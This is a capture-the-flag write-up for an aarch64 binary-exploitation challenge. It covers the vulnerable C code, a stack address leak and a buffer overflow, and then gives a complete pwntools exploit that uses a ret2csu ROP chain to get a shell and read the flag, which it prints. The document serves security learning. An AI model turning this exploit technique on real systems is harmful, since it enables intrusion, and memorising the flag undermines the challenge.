# BabyArmROP [738]
Can u take baby steps with your arms?

flag location : /vuln/flag

`nc pwn.zh3r0.cf 1111`

Files: `BabyArmROP`

```python
[*] 'vuln'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO     (!)
    Stack:    No canary found   (!)
    NX:       NX enabled
    PIE:      PIE enabled
```

Author - codacker

## Solving
Not a whole lot to say for this challenge.
```c
void vuln() {
    char name_buffer[0x20];
    read(0, name_buffer, 0x1f);
    printf("Hello, %s\n; send me your message now: ", name_buffer);
    fflush(stdout);
    read(0, name_buffer, 0x200);
}

int main() {
    printf("Enter your name: ");
    fflush(stdout);
    vuln();
    return 0;
}
```
The first observation to make is that `read(0, buf, ...); printf("... %s ...", buf);` allows for data leaks from the stack, because `read()` doesn't nul-terminate strings. Debugging && menial labour eventually demonstrates that the only pointers leakable from (the first pass of) `vuln()` are PIE addresses.

The other obvious bug in the program is the long, 0x200 byte buffer overflow (with no stack canary). Unlike x86 BOFs, the buffer overflow here will only modify the return pointer of the stack frame _below_ the current stack frame. Which is to say, the BOF in `vuln()` will only affect the return pointer for `main()`. This trait is slightly interesting, because it opens the possibility for a partial overwrite of `__libc_start_main_ret` to a `one_gadget`.

In this case, `C.symbols['__libc_start_main'] == 0000000000020c40` but the best `one_gadget` is `0x64178 == execl("/bin/sh", x1)`, so a partial overwrite doesn't really work out. Instead, ROP will have to be used for this challenge.

I spent a while looking for interesting gadgets, but I mostly discovered nothing of value. In the end, I ended up making an aarch64 implementation of ret2csu, as I'm sure most other participants did.

```python
from pwnscripts import *
context.binary = './vuln'
context.libc = 'lib/libc.so.6'
r = remote('pwn.zh3r0.cf', 1111)
E,C = context.binary, context.libc
E.symbols['csu1'] = 0x920
E.symbols['csu2'] = 0x900
E.symbols['main_ptr'] = 0x10Fd8

r.sendafter('Enter your name: ', 'a'*7+'\n') # add 8 characters to leak PIE. afaik libc cannot be leaked here; the first 8 bytes are a QEMU address && later bytes are also PIE
r.recvline() # 'Hello, aaaaaaa'
E.address = u32(r.recv(4))-0x8a8 # e.g. 17e618a8 vs 17e61000

def csu(w0=E.got['printf'], x1=0, x2=0, call=E.got['printf'], x30=0x12345678):
    R = ROP(E)
    R.raw(b'A'*0x28) # padding required for RIP control
    R.csu1()
    R.raw(fit(
        0x29, # x29
        E.symbols['csu2'], # x30
        0,    # x19 -> x19+1
        1,    # x20
        call, # x21
        w0,   # x22 -> w0
        x1,   # x23 -> x1
        x2,   # x24 -> x2
    ))
    R.raw(fit(
        0x29, # x29
        x30,  # x30
        0x19, # x19 -> x19+1
        0x20, # x20
        0x21, # x21
        0x22, # x22 -> w0
        0x23, # x23 -> x1
        0x24, # x24 -> x2
    ))
    return R.chain()

r.sendafter('now: ', csu(x30=E.symbols['main']))
C.symbols['printf'] = u32(r.recv(4))
r.sendafter('Enter your name: ', b'hi')
r.sendafter('now: ', csu(x1=0, x30=C.select_gadget(2)))

r.sendline('cat /vuln/flag')
print(r.recvuntil(b'}'))
```
This was a really boring method, but it got the job done.
## Flag
`zh3r0{b4by_aaarch64_r0p_f04_fun_4nd_pr0fit}`
